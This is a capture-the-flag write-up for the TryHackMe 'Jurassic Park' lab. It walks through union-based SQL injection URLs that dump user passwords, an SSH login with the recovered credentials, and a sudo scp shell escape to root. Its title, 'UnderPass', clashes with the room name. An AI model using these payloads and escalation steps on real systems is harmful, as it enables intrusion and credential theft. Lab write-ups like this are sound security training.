# THM - UnderPass

#### Ip: 10.10.74.251
#### Name: Jurassic Park
#### Rating: Hard

----------------------------------------------------------------------

![thm_jpark_pic.jpeg](../assets/jurassic_park_assets/thm_jpark_pic.jpeg)

```
This medium-hard task will require you to enumerate the web application, get credentials to the server and find four flags hidden around the file system. Oh, Dennis Nedry has helped us to secure the app too.
```

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/THM/Jurassic_Park]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV 10.10.74.251 
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-12-31 11:22 CST
Nmap scan report for 10.10.74.251
Host is up (0.35s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 45933d22b9d6fa11d18c3a017f67a1ab (RSA)
|   256 07ed484bd9643b2602d4ac7cae9aab7f (ECDSA)
|_  256 6995e9e0d3454624ac6973722290fe3e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Jarassic Park
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.78 seconds
```

Looking at the page on port 80 we find a simple site:

thm_jpark_site.png

Following the online shop link we are redirected to http://10.10.74.251/shop.php

Clicking on purchase package we are redirected to http://10.10.74.251/item.php?id=2

Trying something like `id=2'` we trigger  this warning:

thm_jpark_nope.png

Which at the very bottom humorously has:

```
Try SqlMap.. I dare you..
```

We can confirm the page is vulnerable to SQL injection with: `http://10.10.74.251/item.php?id=1%20or%20sleep(10)`

Continuing to enumerate and also test for IDOR, we find a 'development package' as id=5:

thm_jpark_5.png

Cool. So it looks like there is some character blacklisting going on here.

### Exploitation

Beginning to try to exploit this we can see there are 5 columns:

```
http://10.10.165.197/item.php?id=1%20union%20select%201,2,3,4,5
```

Because we know that the `@` sign is blocked, we can get the Mysql version using `select version()`: 

```
http://10.10.165.197/item.php?id=1%20UNION%20select%201,version(),3,4,5
```

thm_jpark_version.png

We can also begin enumerating the DB with `database()`:

```
http://10.10.165.197/item.php?id=1%20UNION%20select%201,database(),3,4,5
```

thm_jpark_db.png

Viewing the tables:

```
http://10.10.165.197/item.php?id=1%20UNION%20select%201,TABLE_NAME,TABLE_SCHEMA,4,5%20from%20INFORMATION_SCHEMA.TABLES%20where%20table_schema=%22park%22
```

thm_jpark_tables.png

Columns:

```
http://10.10.165.197/item.php?id=1%20UNION%20select%201,group_concat(COLUMN_NAME),TABLE_NAME,4,5%20from%20INFORMATION_SCHEMA.COLUMNS%20where%20table_name=%22users%22
```

thm_jpark_columns.png

Note, we need to use the `group_concat` here

Cool, so now we see the columns username and password.

The string `username` is being blacklisted, but we know we are looking for the password for user Dennis, so let's take a look at the password column:

```
http://10.10.165.197/item.php?id=1%20UNION%20select%201,%20group_concat(password),%203,%204,5%20from%20park.users
``` 
thm_jpark_pass.png

We now have the passwords D0nt3ATM3 and ih8dinos

We can login to SSH with `dennis:ih8dinos`

```
┌──(ryan㉿kali)-[~/THM/Jurassic_Park]
└─$ ssh dennis@10.10.165.197 
```

And grab the flag1.txt flag:

thm_jpark_flag1.png

### Privilege Escalation

Seeing what user dennis can run with elevated permissions we see he can run `scp` as root:

```
dennis@ip-10-10-165-197:/var/www/html$ sudo -l
Matching Defaults entries for dennis on ip-10-10-165-197.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dennis may run the following commands on ip-10-10-165-197.eu-west-1.compute.internal:
    (ALL) NOPASSWD: /usr/bin/scp
dennis@ip-10-10-165-197:/var/www/html$ cd /tmp
```

We can head to https://gtfobins.github.io/gtfobins/scp/#sudo for the commands we'll need to exploit this
```
dennis@ip-10-10-165-197:/tmp$ TF=$(mktemp)
dennis@ip-10-10-165-197:/tmp$ echo 'sh 0<&2 1>&2' > $TF
dennis@ip-10-10-165-197:/tmp$ chmod +x "$TF"
dennis@ip-10-10-165-197:/tmp$ sudo /usr/bin/scp -S $TF x y:
# whoami
root
# hostname
ip-10-10-165-197
```

We can then grab flag5:

thm_jpark_flag5.png

Going back to find the other flags we find flag2's location in `.viminfo`:

```
# File marks:
'0  1  37  ~/.bash_history
'1  2  18  ~/test.sh
'2  2  18  /home/ubuntu/test.sh
'3  1802  31  /tmp/flagFour.txt
'4  1  63  ~/flag1.txt
'5  1  31  /boot/grub/fonts/flagTwo.txt
'6  1  0  /var/www/html/index.php
```

thm_jpark_flag2.png

And we can also find flag3 in `.bash_history`

thm_jpark_flag3.png

Thanks for following along!

-Ryan

-----------------------------------
